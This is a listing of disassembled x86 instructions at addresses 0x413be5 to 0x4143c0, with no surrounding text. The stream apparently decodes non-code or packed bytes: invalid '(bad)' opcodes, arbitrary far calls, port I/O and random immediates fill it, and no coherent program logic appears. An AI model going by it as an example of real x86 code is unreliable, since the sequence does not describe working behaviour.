  413be5:	jbe    0x413ba8
  413be7:	adc    eax,0xe4192a4a
  413bec:	mov    ch,0x8c
  413bee:	jle    0x413bee
  413bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bf1:	call   0xcbe89920
  413bf6:	jmp    0x413b9f
  413bf8:	inc    ecx
  413bf9:	xchg   edx,eax
  413bfa:	in     eax,0x55
  413bfc:	inc    ebp
  413bfd:	f2xm1  
  413bff:	jg     0x413bb3
  413c01:	and    eax,DWORD PTR ds:0x80299f05
  413c07:	xchg   ebx,eax
  413c08:	lds    ecx,FWORD PTR [ebx]
  413c0a:	pusha  
  413c0b:	sub    eax,0xa8f36089
  413c10:	jns    0x413c2a
  413c12:	test   ebp,ebp
  413c14:	adc    dl,BYTE PTR [ebx+0x5a]
  413c17:	inc    ecx
  413c18:	and    DWORD PTR [eax],ebp
  413c1a:	xlat   BYTE PTR ds:[ebx]
  413c1b:	fistp  DWORD PTR [ebx]
  413c1d:	or     al,0xd6
  413c1f:	push   eax
  413c20:	shl    ah,0xfc
  413c23:	daa    
  413c24:	or     esi,edx
  413c26:	adc    eax,DWORD PTR [esi-0x7a72524e]
  413c2c:	popf   
  413c2d:	inc    ebp
  413c2e:	xor    BYTE PTR gs:0xc5293a0b,ch
  413c35:	push   ecx
  413c36:	inc    eax
  413c37:	das    
  413c38:	daa    
  413c39:	pop    ds
  413c3a:	call   0xc95a:0x357501ed
  413c41:	aas    
  413c42:	nop
  413c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c44:	adc    DWORD PTR [ebx+ebp*2-0x35],esi
  413c48:	cmc    
  413c49:	xor    al,0x31
  413c4b:	jnp    0x413c91
  413c4d:	inc    edx
  413c4e:	call   0xb85a:0xac823c67
  413c55:	xor    BYTE PTR [ecx-0x59],dh
  413c58:	inc    edi
  413c59:	sti    
  413c5a:	add    DWORD PTR [ebx-0x14],ebp
  413c5d:	pop    esp
  413c5e:	pop    eax
  413c5f:	mov    al,0xb7
  413c61:	mov    dl,0x5b
  413c63:	std    
  413c64:	ja     0x413cc4
  413c66:	pop    ebx
  413c67:	and    DWORD PTR [edx-0x1d9eb157],ecx
  413c6d:	or     edi,eax
  413c6f:	pusha  
  413c70:	add    eax,0x7225f38c
  413c75:	clc    
  413c76:	call   0xac2c:0x5e7e4bf8
  413c7d:	lods   al,BYTE PTR ds:[esi]
  413c7e:	mov    al,ds:0xde70cfa7
  413c83:	jno    0x413c0b
  413c85:	adc    edi,DWORD PTR [ecx-0x34804dc3]
  413c8b:	push   ebx
  413c8c:	outs   dx,DWORD PTR ds:[esi]
  413c8d:	fadd   st,st(6)
  413c8f:	jle    0x413c8a
  413c91:	or     esp,DWORD PTR [ebp-0x5d50f22f]
  413c97:	mov    ds:0x3cbea77b,eax
  413c9c:	adc    BYTE PTR [ebp-0x66],0x1b
  413ca0:	dec    esi
  413ca1:	ffree  st(1)
  413ca3:	(bad)  
  413ca4:	inc    DWORD PTR ds:0xec34cd4b
  413caa:	call   0xb215:0xbb5537bc
  413cb1:	pop    ebp
  413cb2:	ficom  DWORD PTR [ebx-0x6a]
  413cb5:	dec    esp
  413cb6:	cmp    BYTE PTR [esi],0x5e
  413cb9:	or     BYTE PTR [ebp-0x3d],ah
  413cbc:	pop    DWORD PTR [ebp+0x5b35ee9b]
  413cc2:	mov    ch,BYTE PTR [eax+0x559b2093]
  413cc8:	mov    esp,0x9eb37cde
  413ccd:	xchg   edi,eax
  413cce:	push   0x38
  413cd0:	and    al,BYTE PTR [edx]
  413cd2:	lahf   
  413cd3:	mov    ebp,0xa1abe8a
  413cd8:	jno    0x413d43
  413cda:	cmp    DWORD PTR [edx+esi*4+0x65],0x16
  413cdf:	mov    gs,WORD PTR [ebx]
  413ce1:	push   ebx
  413ce2:	pop    ebp
  413ce3:	mov    DWORD PTR es:[edi+0x3a],edx
  413ce7:	fdiv   QWORD PTR [edx-0x4e7e7b7b]
  413ced:	lea    ebp,ds:0xefe2b35b
  413cf3:	in     al,0xe7
  413cf5:	inc    ebx
  413cf6:	dec    edi
  413cf7:	inc    ebx
  413cf8:	ror    BYTE PTR [ecx+0x2a],cl
  413cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cfc:	mov    eax,ds:0x32e1f6cf
  413d01:	mov    esp,0x9b7d700
  413d06:	into   
  413d07:	popf   
  413d08:	inc    edi
  413d09:	cdq    
  413d0a:	pop    edx
  413d0b:	jbe    0x413cc0
  413d0d:	pop    edx
  413d0e:	stos   DWORD PTR es:[edi],eax
  413d0f:	test   eax,0xebcdd4c9
  413d14:	mov    dl,0x95
  413d16:	sub    edx,DWORD PTR [ebx-0x6b6a40d9]
  413d1c:	jbe    0x413cb4
  413d1e:	loopne 0x413d49
  413d20:	fwait
  413d21:	mov    eax,eax
  413d23:	retf   
  413d24:	or     eax,0x97da0db5
  413d29:	or     esp,ebp
  413d2b:	jmp    0x413ce6
  413d2d:	xor    ebx,0x9de73ce9
  413d33:	out    dx,al
  413d34:	sbb    eax,0xb2e85f07
  413d39:	addr16 push esi
  413d3b:	(bad)  
  413d3c:	bound  ecx,QWORD PTR [ebx]
  413d3e:	nop
  413d3f:	ins    BYTE PTR es:[edi],dx
  413d40:	inc    ecx
  413d41:	inc    edi
  413d42:	inc    esp
  413d43:	inc    ebx
  413d44:	mov    ds:0x2c789428,eax
  413d49:	test   ch,cl
  413d4b:	pop    es
  413d4c:	push   edx
  413d4d:	scas   al,BYTE PTR es:[edi]
  413d4e:	aaa    
  413d4f:	(bad)
  413d53:	pop    ss
  413d54:	push   es
  413d55:	test   edi,esp
  413d57:	lea    esi,[edx]
  413d59:	and    BYTE PTR [ebp+0x17738ffd],bh
  413d5f:	lods   al,BYTE PTR ds:[esi]
  413d60:	pop    edi
  413d61:	add    DWORD PTR [edx+eiz*1+0x3f1a90c0],ebx
  413d68:	inc    ecx
  413d69:	cmc    
  413d6a:	pop    esi
  413d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d6c:	pushf  
  413d6d:	enter  0xabc9,0xd8
  413d71:	jnp    0x413ded
  413d73:	stc    
  413d74:	jmp    0x5034:0xd937a41d
  413d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d7c:	dec    esi
  413d7d:	pop    ecx
  413d7e:	pushf  
  413d7f:	inc    ecx
  413d80:	inc    ebp
  413d81:	and    DWORD PTR [esi],ebx
  413d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d84:	lds    ebp,FWORD PTR [esi]
  413d86:	mov    es,WORD PTR [edi-0x44c11922]
  413d8c:	mov    dl,0x8a
  413d8e:	mov    ebp,DWORD PTR [ebp+0x61cbe276]
  413d94:	stos   DWORD PTR es:[edi],eax
  413d95:	or     ebx,DWORD PTR [edx]
  413d97:	dec    edi
  413d98:	arpl   ax,bx
  413d9a:	clc    
  413d9b:	and    al,0xe6
  413d9d:	jno    0x413d34
  413d9f:	adc    bh,BYTE PTR [ecx-0x13]
  413da2:	pop    ebx
  413da3:	dec    ecx
  413da4:	jnp    0x413d85
  413da6:	or     DWORD PTR [edi-0x6d6a2ef4],esp
  413dac:	out    dx,eax
  413dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dae:	and    DWORD PTR [edi+0x4b54922],0x7f
  413db5:	and    eax,0x9d8a057f
  413dba:	outs   dx,BYTE PTR ds:[esi]
  413dbb:	daa    
  413dbc:	call   0x2891:0xaec20930
  413dc3:	mov    ecx,0x27b83bc5
  413dc8:	jmp    0xe58b5ab5
  413dcd:	ins    DWORD PTR es:[edi],dx
  413dce:	mov    ah,0xe6
  413dd0:	jmp    0x413df3
  413dd2:	call   0xd077:0x6a363beb
  413dd9:	pop    ss
  413dda:	mov    esp,0xc66f2b48
  413ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de0:	and    BYTE PTR [ebp+0x6e71b611],ch
  413de6:	fisubr DWORD PTR ds:[si+0x7c]
  413deb:	cmp    DWORD PTR [ebx+0x5e5decb0],0x9f84560b
  413df5:	loope  0x413e71
  413df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413df8:	(bad)  
  413df9:	dec    ecx
  413dfa:	shr    cl,0x90
  413dfd:	lahf   
  413dfe:	adc    ecx,ebp
  413e00:	mov    dl,0x7f
  413e02:	ds xor eax,0x73af4a0c
  413e08:	mov    bh,0xa
  413e0a:	add    BYTE PTR [ebp+0x4b],bh
  413e0d:	mov    bl,0x9e
  413e0f:	or     esp,ebx
  413e11:	sub    esi,DWORD PTR [eax-0x2f8d5071]
  413e17:	adc    dh,BYTE PTR [edx-0x5b]
  413e1a:	inc    edx
  413e1b:	aas    
  413e1c:	ficomp WORD PTR ds:0x188ea78a
  413e22:	loopne 0x413e6a
  413e24:	jbe    0x413e79
  413e26:	arpl   WORD PTR [ecx-0x6c4bf4e],cx
  413e2c:	push   0xfffffff5
  413e2e:	outs   dx,BYTE PTR ds:[esi]
  413e2f:	jmp    0xaae749a0
  413e34:	dec    esi
  413e35:	xchg   edx,edx
  413e37:	push   0xbb9ab8c3
  413e3c:	push   cs
  413e3d:	jo     0x413e39
  413e3f:	retf   
  413e40:	push   ebx
  413e41:	(bad)  
  413e42:	leave  
  413e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e44:	iret   
  413e45:	outs   dx,DWORD PTR ds:[esi]
  413e46:	loopne 0x413e01
  413e48:	addr16 mov ah,0xd0
  413e4b:	pop    ecx
  413e4c:	mov    dl,0x57
  413e4e:	rcr    DWORD PTR [edi],0xc6
  413e51:	nop
  413e52:	jmp    0x7dd6:0xb70af3ec
  413e59:	or     dh,BYTE PTR [edx]
  413e5b:	mov    al,ds:0x19d3df0b
  413e60:	mov    dl,0x52
  413e62:	fcmovu st,st(6)
  413e64:	jle    0x413e33
  413e66:	lods   al,BYTE PTR ds:[esi]
  413e67:	sub    ebx,esi
  413e69:	or     BYTE PTR [edi-0x451ca9fd],bh
  413e6f:	int3   
  413e70:	sbb    DWORD PTR [edx],esi
  413e72:	push   edx
  413e73:	imul   esp,DWORD PTR [eax],0xd4559433
  413e79:	jbe    0x413ef5
  413e7b:	and    BYTE PTR [esi-0x245af55a],dh
  413e81:	push   cs
  413e82:	mov    dh,0xa7
  413e84:	xor    cl,BYTE PTR [esi+0x3bc6d148]
  413e8a:	fnsave [edi+0x349a0502]
  413e90:	adc    esp,DWORD PTR [eax-0x5917c71f]
  413e96:	and    DWORD PTR [edi],edi
  413e98:	mov    ds:0x666b2a0a,al
  413e9d:	sub    bh,BYTE PTR [eax+0xdf9274]
  413ea3:	or     BYTE PTR [edx+0x62b726e4],dh
  413ea9:	and    ebx,edi
  413eab:	ins    DWORD PTR es:[edi],dx
  413eac:	xor    al,0x9
  413eae:	push   ebp
  413eaf:	xlat   BYTE PTR ds:[ebx]
  413eb0:	jns    0x413e37
  413eb2:	jo     0x413f2f
  413eb4:	push   edx
  413eb5:	cwde   
  413eb6:	ret    
  413eb7:	push   es
  413eb8:	mov    dl,0xcd
  413eba:	xlat   BYTE PTR ds:[ebx]
  413ebb:	dec    edi
  413ebc:	add    dh,cl
  413ebe:	push   0x629cabc8
  413ec3:	bsf    ebx,ebx
  413ec6:	shr    DWORD PTR [edi-0x756568d6],0xe0
  413ecd:	ins    DWORD PTR es:[edi],dx
  413ece:	and    al,0x9b
  413ed0:	cmc    
  413ed1:	pop    ss
  413ed2:	adc    edx,eax
  413ed4:	sub    ecx,DWORD PTR [ebx]
  413ed6:	out    0x13,eax
  413ed8:	adc    al,0x58
  413eda:	jle    0x413f2a
  413edc:	mov    dl,0x43
  413ede:	dec    esp
  413edf:	mov    ah,0x43
  413ee1:	dec    esi
  413ee2:	dec    edi
  413ee3:	sbb    eax,0x8740904
  413ee8:	adc    DWORD PTR [edx],0xffffffeb
  413eeb:	sub    al,0x6d
  413eed:	retf   
  413eee:	push   edx
  413eef:	in     al,0x88
  413ef1:	or     al,0xc5
  413ef3:	mov    bh,0x53
  413ef5:	es mov ebp,0xf78b3b52
  413efb:	jecxz  0x413f37
  413efd:	lods   al,BYTE PTR ds:[esi]
  413efe:	call   0xcae1:0x6f347a04
  413f05:	into   
  413f06:	in     eax,0x5b
  413f08:	mov    cl,0x37
  413f0a:	sub    ch,BYTE PTR [edi-0x1accd04e]
  413f10:	ds push ds
  413f12:	add    ch,BYTE PTR [edx+0x683809b2]
  413f18:	inc    ecx
  413f19:	pop    ebx
  413f1a:	ret    
  413f1b:	mov    ebp,0xff30369e
  413f20:	lods   eax,DWORD PTR ds:[esi]
  413f21:	cmp    eax,DWORD PTR ds:0xe8c7db62
  413f27:	add    ebp,DWORD PTR [bp-0x59a8]
  413f2c:	mov    dl,0x7d
  413f2e:	pop    ecx
  413f2f:	ins    DWORD PTR es:[edi],dx
  413f30:	stos   DWORD PTR es:[edi],eax
  413f31:	dec    ebp
  413f32:	leave  
  413f33:	sahf   
  413f34:	das    
  413f35:	or     esp,DWORD PTR [eax+ebx*1+0x2fabb34c]
  413f3c:	inc    esp
  413f3d:	jno    0x413ed9
  413f3f:	add    BYTE PTR [ebx],0x77
  413f42:	sbb    esp,esp
  413f44:	push   ecx
  413f45:	cmp    esi,DWORD PTR [edx-0x45]
  413f48:	xor    DWORD PTR [eax],edx
  413f4a:	pop    eax
  413f4b:	daa    
  413f4c:	rcr    DWORD PTR [eax+0x1d2d193c],0x9a
  413f53:	loope  0x413f7a
  413f55:	mov    ?,WORD PTR [ebx+0x5d]
  413f58:	iret   
  413f59:	aam    0x43
  413f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f5c:	xor    al,BYTE PTR [eax+0x282261e1]
  413f62:	loop   0x413f00
  413f64:	mov    dl,0x87
  413f66:	fcmovnb st,st(3)
  413f68:	mov    al,ds:0x435f9d40
  413f6d:	or     al,0x2
  413f6f:	xor    DWORD PTR [ebx+0x2764a689],esi
  413f75:	xchg   edx,eax
  413f76:	xor    al,dh
  413f78:	pop    ebp
  413f79:	pop    esi
  413f7a:	fwait
  413f7b:	lea    ebx,[ebp-0x461b7b53]
  413f81:	out    dx,al
  413f82:	jmp    0x5ba9:0xbff74e4e
  413f89:	ins    DWORD PTR es:[edi],dx
  413f8a:	cmp    eax,0x143db259
  413f8f:	in     eax,dx
  413f90:	inc    ebp
  413f91:	gs call 0x7e73:0xf09c8949
  413f99:	or     dh,BYTE PTR [edx-0x5a]
  413f9c:	xchg   ecx,eax
  413f9d:	jge    0x413f6b
  413f9f:	sti    
  413fa0:	sub    eax,DWORD PTR [edi-0x37f0b052]
  413fa6:	bound  edx,QWORD PTR [edx-0x4f]
  413fa9:	idiv   BYTE PTR [ecx]
  413fab:	dec    edx
  413fac:	pop    es
  413fad:	jmp    0xe15143c6
  413fb2:	add    esi,eax
  413fb4:	shl    DWORD PTR [edx+0x6e],cl
  413fb7:	lea    eax,[edx]
  413fb9:	and    bl,BYTE PTR [edi]
  413fbb:	fmul   st(7),st
  413fbd:	or     ecx,DWORD PTR [edi+0x5f558bea]
  413fc3:	mul    BYTE PTR [esi]
  413fc5:	or     bl,BYTE PTR [edx-0x5b09c7c0]
  413fcb:	or     DWORD PTR cs:[edi-0x15],eax
  413fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd0:	sbb    al,0xef
  413fd2:	ja     0x413f86
  413fd4:	mov    ds:0xf7fd763,eax
  413fd9:	xchg   esp,eax
  413fda:	call   0x678:0xdfa90514
  413fe1:	das    
  413fe2:	cwde   
  413fe3:	fistp  WORD PTR [edi+ebp*1-0x6b]
  413fe7:	cmp    bl,BYTE PTR [eax+0x8]
  413fea:	in     al,0xc6
  413fec:	lods   eax,DWORD PTR ds:[esi]
  413fed:	pop    ecx
  413fee:	push   edx
  413fef:	add    bh,BYTE PTR [edx-0x72]
  413ff2:	call   0x5593:0x878f83d1
  413ff9:	pop    ebp
  413ffa:	adc    BYTE PTR [ebx-0x18d79f17],bh
  414000:	add    DWORD PTR [edx-0x8],ecx
  414003:	rcr    DWORD PTR [ecx-0x8],0x91
  414007:	loope  0x41403a
  414009:	enter  0x5275,0x32
  41400d:	je     0x41404e
  41400f:	inc    ecx
  414010:	das    
  414011:	mov    ebp,0x5d81579a
  414016:	gs jp  0x413fb5
  414019:	pop    edi
  41401a:	cmp    ah,BYTE PTR [edi-0x21c1679f]
  414020:	dec    ecx
  414021:	fwait
  414022:	dec    edx
  414023:	lea    ecx,[edx]
  414025:	jp     0x414061
  414027:	sbb    eax,0x72890646
  41402c:	imul   edx,DWORD PTR [ecx],0xffffff9a
  41402f:	push   cs
  414030:	fsubr  DWORD PTR ds:0xbf48c70
  414036:	aaa    
  414037:	mov    dl,0x8b
  414039:	jl     0x41408c
  41403b:	pop    ebp
  41403c:	in     eax,0x68
  41403e:	call   0x657c:0x667841fc
  414045:	sub    dh,BYTE PTR [eax]
  414047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414048:	std    
  414049:	sbb    al,0xc7
  41404b:	out    0x7b,eax
  41404d:	outs   dx,DWORD PTR ds:[esi]
  41404e:	mov    ds:0x7985b002,eax
  414053:	inc    eax
  414054:	into   
  414055:	or     DWORD PTR [esi],esp
  414057:	daa    
  414058:	inc    esp
  414059:	inc    edi
  41405a:	and    BYTE PTR [edx-0x6724fb64],0xd
  414061:	lock jp 0x414059
  414064:	pop    ebx
  414065:	mov    DWORD PTR [eax+ecx*2-0x4e],ebp
  414069:	(bad)  ds:0xbf6c9bf2
  41406f:	cdq    
  414070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414071:	daa    
  414072:	cwde   
  414073:	ins    BYTE PTR es:[edi],dx
  414074:	out    dx,al
  414075:	sbb    DWORD PTR [edi],ebx
  414077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414078:	(bad)  
  414079:	sub    DWORD PTR [eax],ecx
  41407b:	ror    DWORD PTR [ebx-0xb],cl
  41407e:	test   edi,esp
  414080:	mov    ch,0xa0
  414082:	inc    edi
  414083:	adc    eax,0x2960a572
  414088:	aaa    
  414089:	xchg   esi,eax
  41408a:	and    BYTE PTR [edi+0x2d0f13a8],ah
  414090:	mov    al,ds:0x89362bb0
  414095:	push   edi
  414096:	add    al,0x24
  414098:	repz aam 0xbb
  41409b:	retf   0xdb31
  41409e:	fimul  DWORD PTR [ebp-0x7f8bf41c]
  4140a4:	imul   ebx,DWORD PTR [ebx],0x13d50920
  4140aa:	outs   dx,BYTE PTR ds:[esi]
  4140ab:	aas    
  4140ac:	mov    dl,0xe1
  4140ae:	es pop ss
  4140b0:	jp     0x4140ac
  4140b2:	pop    ds
  4140b3:	inc    ebx
  4140b4:	or     BYTE PTR [ebx],0xa5
  4140b7:	clc    
  4140b8:	xor    esi,DWORD PTR [eax+0x28]
  4140bb:	mov    DWORD PTR [ebp+ebp*4-0x244dd120],esp
  4140c2:	push   0x3666cfc
  4140c7:	popf   
  4140c8:	xor    BYTE PTR [edi],al
  4140ca:	or     ah,bh
  4140cc:	mov    edx,ebp
  4140ce:	xor    BYTE PTR [eax],dh
  4140d0:	enter  0x997f,0xba
  4140d4:	leave  
  4140d5:	lods   eax,DWORD PTR ds:[esi]
  4140d6:	push   0xbbebd4e4
  4140db:	push   eax
  4140dc:	dec    ebx
  4140dd:	or     edi,DWORD PTR [ecx+0x18]
  4140e0:	mov    ecx,0x3b624b3c
  4140e5:	sbb    eax,0xabbdbfef
  4140ea:	cmovo  ecx,DWORD PTR [edx+0x4b]
  4140ee:	mov    al,ds:0x56cfce7
  4140f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f4:	sbb    DWORD PTR [eax-0x18],ebx
  4140f7:	retf   
  4140f8:	outs   dx,BYTE PTR ds:[esi]
  4140f9:	cs jno 0x41417a
  4140fc:	mov    al,ds:0xb25487e9
  414101:	test   BYTE PTR [edx],al
  414103:	sub    ch,BYTE PTR [ecx]
  414105:	mov    eax,ds:0xaa378b42
  41410a:	mov    al,0xa7
  41410c:	fisubr DWORD PTR [esi]
  41410e:	dec    esi
  41410f:	mov    ecx,0x87e84e8
  414114:	mov    dl,0xdd
  414116:	mov    bl,0xe6
  414118:	ins    BYTE PTR es:[edi],dx
  414119:	push   edx
  41411a:	jle    0x414125
  41411c:	mov    esp,0xda958118
  414121:	push   ss
  414122:	aam    0x98
  414124:	push   edx
  414125:	pop    edi
  414126:	faddp  st(4),st
  414128:	aad    0x1f
  41412a:	call   0x37a:0xd52e1152
  414131:	aaa    
  414132:	mov    edx,0x760a3aa7
  414137:	sti    
  414138:	cmp    al,0x29
  41413a:	repz sbb eax,0x4dd6c1b2
  414140:	mov    eax,ds:0x4516e0d
  414145:	or     eax,DWORD PTR [edi-0xd4595fc]
  41414b:	xor    DWORD PTR [eax],edi
  41414d:	add    eax,0xb7dd7a1
  414152:	fbstp  TBYTE PTR [esi]
  414154:	scas   al,BYTE PTR es:[edi]
  414155:	cld    
  414156:	and    al,0x8d
  414158:	dec    ebp
  414159:	or     BYTE PTR [eax-0x50],al
  41415c:	xchg   ebp,eax
  41415d:	xchg   ecx,eax
  41415e:	mov    esi,0xe6930a90
  414163:	or     ecx,esi
  414165:	jmp    0x68f4184e
  41416a:	jo     0x414111
  41416c:	retw   
  41416e:	adc    ecx,0xffffffd7
  414171:	or     edi,DWORD PTR [esi]
  414173:	iret   
  414174:	jecxz  0x4140f8
  414176:	and    BYTE PTR [edx+ecx*8+0x54],cl
  41417a:	call   0xa5bc:0x4069312c
  414181:	dec    ebp
  414182:	ret    
  414183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414184:	iret   
  414185:	and    BYTE PTR [esi-0x4cacf292],ah
  41418b:	loopne 0x41413f
  41418d:	jle    0x414132
  41418f:	inc    ecx
  414190:	fdiv   st(1),st
  414192:	mov    esi,0x77f4ae44
  414197:	(bad)  
  414198:	rcl    BYTE PTR ds:0x7ce3eff1,cl
  41419e:	call   0xb5ee:0xc7c4acf4
  4141a5:	das    
  4141a6:	xchg   DWORD PTR [ecx+0x5799439d],eax
  4141ac:	adc    ah,BYTE PTR [eax+0x33]
  4141af:	addr16 dec ebp
  4141b1:	jne    0x4141ca
  4141b3:	inc    edi
  4141b4:	pop    ecx
  4141b5:	or     edi,DWORD PTR [edx-0x40fd23c4]
  4141bb:	repz inc esp
  4141bd:	call   0xa972:0x41d1789a
  4141c4:	push   ebp
  4141c5:	mov    WORD PTR [esi-0x5a],?
  4141c8:	dec    edx
  4141c9:	mov    edi,0x3e13a67a
  4141ce:	ja     0x414226
  4141d0:	stos   BYTE PTR es:[edi],al
  4141d1:	mov    ebp,0x9d696e6d
  4141d7:	mov    eax,0xf72a7b16
  4141dc:	ror    DWORD PTR [esp+ebx*8],cl
  4141df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e0:	out    0xd8,eax
  4141e2:	mov    al,ds:0x2926d5b
  4141e7:	jne    0x41419b
  4141e9:	test   eax,0x7aedbe9e
  4141ee:	pop    es
  4141ef:	inc    esi
  4141f0:	mov    bh,0x31
  4141f2:	push   edi
  4141f3:	pop    edi
  4141f4:	xor    dl,BYTE PTR [ecx+0x42fea9fb]
  4141fa:	fnstsw WORD PTR [eax]
  4141fc:	mov    ch,0x1e
  4141fe:	inc    eax
  4141ff:	mov    bl,0x11
  414201:	add    BYTE PTR [edx+0x18],bl
  414204:	lea    eax,[edx+0x5f39a7cc]
  41420a:	and    ebp,ecx
  41420c:	dec    ecx
  41420d:	pop    edx
  41420e:	nop
  41420f:	jecxz  0x4141c0
  414211:	push   esi
  414212:	and    al,0x42
  414214:	xor    cl,BYTE PTR [esi+0x5c]
  414217:	stc    
  414218:	shl    DWORD PTR [edx-0x10995892],1
  41421e:	scas   eax,DWORD PTR es:[edi]
  41421f:	jo     0x4141c5
  414221:	shr    DWORD PTR [edx+ebx*8-0x37757c4e],1
  414228:	aam    0xc6
  41422a:	cmp    al,0x8
  41422c:	jmp    0x77833036
  414231:	lea    ebx,[edx]
  414233:	inc    esp
  414234:	jp     0x41420f
  414236:	xchg   ebp,eax
  414237:	(bad)  
  414238:	mov    dl,0x80
  41423a:	leave  
  41423b:	jbe    0x41427b
  41423d:	sbb    BYTE PTR [ecx+esi*2+0x14230b5b],al
  414244:	dec    esp
  414245:	mov    ebp,0xf821925e
  41424a:	call   0x6ae7:0x120660f6
  414251:	mov    bl,0xe3
  414253:	call   0xcdb1:0xd746a531
  41425a:	add    esi,DWORD PTR [edx+0x1d]
  41425d:	push   edx
  41425e:	sbb    bl,BYTE PTR [ecx]
  414260:	mov    al,0xe8
  414262:	call   0x9d1b:0x48107239
  414269:	mov    ecx,0xb00ba0a1
  41426e:	shl    DWORD PTR [edx+0x6c451bd4],cl
  414274:	int    0x46
  414276:	jbe    0x41429f
  414278:	mov    dl,0xba
  41427a:	(bad)  [edi-0x6896ad3]
  414280:	push   eax
  414281:	or     ebp,DWORD PTR [eax+0x2c1ddfa3]
  414287:	in     eax,dx
  414288:	jmp    0x1b2b:0xcf0f9aca
  41428f:	push   ebp
  414290:	jg     0x4142c5
  414292:	jle    0x41423c
  414294:	adc    eax,DWORD PTR [ecx+edx*8-0x30]
  414298:	xor    al,BYTE PTR [ebp+0x79]
  41429b:	sbb    al,0x5
  41429d:	outs   dx,BYTE PTR ds:[esi]
  41429e:	test   BYTE PTR [ecx],ah
  4142a0:	push   cs
  4142a1:	test   DWORD PTR [ebx],esp
  4142a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a4:	daa    
  4142a5:	cmp    ebx,esi
  4142a7:	xor    DWORD PTR [edx-0x1],esp
  4142aa:	aas    
  4142ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ac:	ss dec ecx
  4142ae:	mov    bl,0x54
  4142b0:	mov    al,ds:0xb2722466
  4142b5:	push   ebx
  4142b6:	cmc    
  4142b7:	mov    al,ds:0x4af49527
  4142bc:	xor    DWORD PTR [eax],ecx
  4142be:	(bad)  
  4142bf:	icebp  
  4142c0:	cmp    eax,0x213fed01
  4142c5:	mov    ch,BYTE PTR [edx-0x20]
  4142c8:	jns    0x4142af
  4142ca:	xchg   esp,eax
  4142cb:	stos   BYTE PTR es:[edi],al
  4142cc:	lods   eax,DWORD PTR ds:[esi]
  4142cd:	cs cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4142d0:	pop    es
  4142d1:	(bad)  
  4142d3:	inc    ebx
  4142d4:	mov    al,0xb
  4142d6:	shl    al,0xd0
  4142d9:	fmul   st,st(1)
  4142db:	loope  0x414291
  4142dd:	enter  0x55eb,0xb2
  4142e1:	xchg   BYTE PTR ds:0x7f1b0f91,dh
  4142e7:	retf   
  4142e8:	xchg   DWORD PTR [ebx],ecx
  4142ea:	dec    edi
  4142eb:	xchg   ebx,eax
  4142ec:	push   ds
  4142ed:	inc    eax
  4142ee:	xor    DWORD PTR [ebx+0x469afe94],0x4c3043c9
  4142f8:	iret   
  4142f9:	and    eax,0xf3a3a799
  4142fe:	mov    dh,0x9
  414300:	shl    DWORD PTR [esi-0x394dbc4b],cl
  414306:	iret   
  414307:	dec    ecx
  414308:	outs   dx,DWORD PTR ds:[esi]
  414309:	retf   0xbb88
  41430c:	call   0x67db:0x32bdc0b
  414313:	test   al,dl
  414315:	push   cs
  414316:	call   0x9595:0xfc9de382
  41431d:	cmp    BYTE PTR [ecx],cl
  41431f:	(bad)  
  414321:	or     eax,DWORD PTR [ebx+eiz*2]
  414324:	mov    ebx,0x88bc9a4
  414329:	retf   0xa99a
  41432c:	loop   0x41438a
  41432e:	fucomi st,st(4)
  414330:	mov    eax,0x95a72e9b
  414335:	or     cl,al
  414337:	mov    eax,0x3893313c
  41433c:	mov    ch,0x2a
  41433e:	out    dx,eax
  41433f:	sbb    esi,DWORD PTR [eax]
  414341:	sar    DWORD PTR [edx-0x6],cl
  414344:	mov    al,0x3e
  414346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414348:	mov    esp,0x11b0ce73
  41434d:	icebp  
  41434e:	inc    esp
  41434f:	pop    ss
  414350:	mov    dl,0xd8
  414352:	shl    DWORD PTR [ebx-0x24cf9337],1
  414358:	mov    al,ds:0x5045e3ef
  41435d:	cmc    
  41435e:	lea    esp,[edi-0x46b89896]
  414364:	push   ecx
  414365:	pop    esi
  414366:	push   0xa1aeb234
  41436b:	jb     0x414330
  41436d:	pop    eax
  41436e:	mov    DWORD PTR [edx],edi
  414370:	dec    ecx
  414371:	or     esi,DWORD PTR [edi+eiz*2+0x14133a2]
  414378:	test   BYTE PTR [esi+0x4b2f3ee],cl
  41437e:	mov    ecx,0xbca3814b
  414383:	or     ch,BYTE PTR [esi]
  414385:	or     esi,DWORD PTR [edi+ebx*8]
  414388:	(bad)  
  414389:	or     eax,0x854fa6e7
  41438e:	call   0x80a5:0x36c216a8
  414395:	ja     0x414347
  414397:	mov    al,ds:0x83ddd4f4
  41439c:	mov    ds:0x48dd208a,al
  4143a1:	out    0x6a,eax
  4143a3:	xchg   edi,eax
  4143a4:	mov    dl,0x8f
  4143a6:	ja     0x41439d
  4143a8:	mov    ds:0x74e002e3,eax
  4143ad:	js     0x414410
  4143af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b0:	bt     DWORD PTR [ebp-0x6cea0ece],eax
  4143b7:	(bad)  
  4143b8:	mov    dl,0x7
  4143ba:	sbb    DWORD PTR [ebx],edi
  4143bc:	repz cmp DWORD PTR [ecx+0x44],edx
  4143c0:	xor    al,0xb
